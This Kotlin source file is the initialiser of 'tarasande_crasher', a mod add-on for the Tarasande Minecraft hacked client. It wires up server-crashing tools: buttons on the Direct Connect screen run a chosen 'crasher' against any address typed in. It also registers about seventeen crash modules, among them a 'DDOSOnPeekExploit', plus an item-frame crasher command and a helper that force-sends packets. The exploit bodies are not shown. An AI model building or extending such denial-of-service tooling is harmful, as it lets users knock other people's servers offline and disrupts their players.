package su.mandora.tarasande_crasher

import su.mandora.tarasande_crasher.command.CommandItemFrameCrasher
import su.mandora.tarasande_crasher.crasher.ManagerCrasher
import net.fabricmc.api.ClientModInitializer
import su.mandora.tarasande.event.impl.EventSuccessfulLoad
import su.mandora.tarasande.system.screen.screenextensionsystem.ManagerScreenExtension
import net.minecraft.client.gui.screen.DirectConnectScreen
import net.minecraft.client.network.ServerAddress
import net.minecraft.network.packet.Packet
import net.minecraft.util.Formatting
import su.mandora.tarasande.feature.statusrenderer.StatusRenderer
import su.mandora.tarasande.mc
import su.mandora.tarasande.system.feature.commandsystem.ManagerCommand
import su.mandora.tarasande.system.feature.modulesystem.ManagerModule
import su.mandora.tarasande.system.screen.panelsystem.screen.impl.ScreenBetterOwnerValues
import su.mandora.tarasande.system.screen.screenextensionsystem.ScreenExtensionButtonList
import su.mandora.tarasande.util.player.chat.CustomChat
import org.lwjgl.glfw.GLFW
import su.mandora.tarasande.event.EventDispatcher
import su.mandora.tarasande.injection.accessor.IClientConnection
import su.mandora.tarasande_crasher.module.*

fun errorMessage(text: String) {
    @Suppress("NAME_SHADOWING") val text = Formatting.RED.toString() + text
    if (mc.currentScreen == null) {
        CustomChat.printChatMessage(text)
    } else {
        StatusRenderer.setStatus(mc.currentScreen!!, text)
    }
}

fun forcePacket(packet: Packet<*>) {
    (mc.networkHandler!!.connection as IClientConnection).tarasande_forceSend(packet)
}

class TarasandeCrasher : ClientModInitializer {

    override fun onInitializeClient() {
        EventDispatcher.add(EventSuccessfulLoad::class.java) {
            ManagerScreenExtension.add(ScreenExtensionButtonList(DirectConnectScreen::class.java).apply {
                    for (crasher in ManagerCrasher.list) {
                        val name = crasher.name + " Crasher"
                        add(name, direction = ScreenExtensionButtonList.Direction.RIGHT) {
                            if (it == GLFW.GLFW_MOUSE_BUTTON_LEFT || it == GLFW.GLFW_MOUSE_BUTTON_MIDDLE) {
                                try {
                                    ServerAddress.parse((mc.currentScreen as DirectConnectScreen).addressField.text).apply {
                                        crasher.crash(address, port)
                                        StatusRenderer.setStatus(mc.currentScreen!!, Formatting.GREEN.toString() + "Successfully executed crasher $name")
                                    }
                                } catch (e: Exception) {
                                    StatusRenderer.setStatus(mc.currentScreen!!, Formatting.RED.toString() + "Failed to execute crasher $name, see logs for more details")
                                    e.printStackTrace()
                                }
                            } else if (it == GLFW.GLFW_MOUSE_BUTTON_RIGHT) {
                                mc.setScreen(ScreenBetterOwnerValues(name, mc.currentScreen!!, crasher))
                            }
                        }
                    }
                }
            )

            ManagerModule.add(
                ModuleShutdownDuraCrasher(),
                ModuleDDOSOnPeekExploit(),
                ModuleBoatCrasher(),
                ModuleOffHandCrasher(),
                ModuleZeroSmasher(),
                ModuleSinglePacketCrasher(),
                ModuleFlyCrasher(),
                ModulePositionCrasher(),
                ModuleSwingCrasher(),
                ModulePluginCommandCrasher(),
                ModuleParticleCrasher(),
                ModuleWalkCrasher(),
                ModuleSkriptCrasher(),
                ModuleCryptoCrasher(),
                ModuleCreativeCrasher(),
                ModuleAutoCompleteCrasher(),
                ModuleCICCrasher(),
            )

            ManagerCommand.add(
                CommandItemFrameCrasher()
            )
        }
    }
}
